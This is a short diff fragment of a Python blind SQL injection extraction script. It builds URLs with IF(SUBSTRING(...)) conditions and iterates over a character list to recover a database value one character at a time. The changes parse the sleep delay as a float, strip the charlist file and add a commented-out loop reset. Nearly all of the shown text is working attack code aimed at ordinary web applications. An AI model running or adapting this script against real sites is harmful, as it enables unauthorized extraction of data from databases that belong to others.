@@ -33,7 +33,7 @@ def main():
             parse = True
         elif o == "-s":
             try:
-                sleep = int(a)
+                sleep = float(a)
             except Exception as e:
                 print(e)
 
@@ -61,7 +61,7 @@ def main():
         urlgen = lambda char, i : root_url + "IF(SUBSTRING(" + conditional + ",%d,1)=\"%s\",1,0)" % (i, char)
         value = ""
         substr_i = 1
-        char_str = open("charlist.txt").read()
+        char_str = open("charlist.txt").read().strip()
         char_i = 0
         
         while char_i < len(char_str):
@@ -77,6 +77,8 @@ def main():
                 char_i += 1
             if sleep:
                 time.sleep(sleep)
+            # if char_i == len(char_str) and substr_i < 25:
+            #     char_i = 0
         print("The value of %s on URL %s is %s" % (conditional, root_url, value))
 
     except Exception as e:
